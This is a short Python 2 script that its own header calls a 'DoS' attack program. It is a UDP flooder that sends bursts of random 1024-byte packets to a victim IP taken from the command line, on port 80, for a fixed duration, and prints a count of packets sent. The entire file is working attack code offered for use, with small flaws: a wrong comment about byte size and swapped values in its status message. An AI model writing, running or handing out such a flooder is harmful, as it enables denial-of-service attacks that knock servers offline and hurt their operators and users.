# This is my UDP Flooder.
# Coded in Python.
# This is a 'Dos' attack program to attack servers, you set the IP and the port and the amount of seconds and it will start flooding to that server ^_^
import time
import socket
import random

import sys

credits = (
    'UDP Flood'
    'c0d3r:  Thedabosk189- [NetArrivals] Team'
)
client = socket.socket(socket.AF_INET,
                       socket.SOCK_DGRAM)
bytes = random._urandom(1024)  # 1024 represents one byte to the server


def pres():  # def would be the same as void in C but in python we say def
    global credits
    print credits


pres()
victim = sys.argv[1]
print victim
vport = 80
duration = 2
timeout = time.time() + duration
sent = 0

while 1:
    if time.time() > timeout:
        break
    else:
        pass
    client.sendto(bytes, (victim, vport))
    sent += 1

    if sent % 1000 == 0:
        print "Attacking %s sent packages %s at the port %s " % (sent, victim, vport)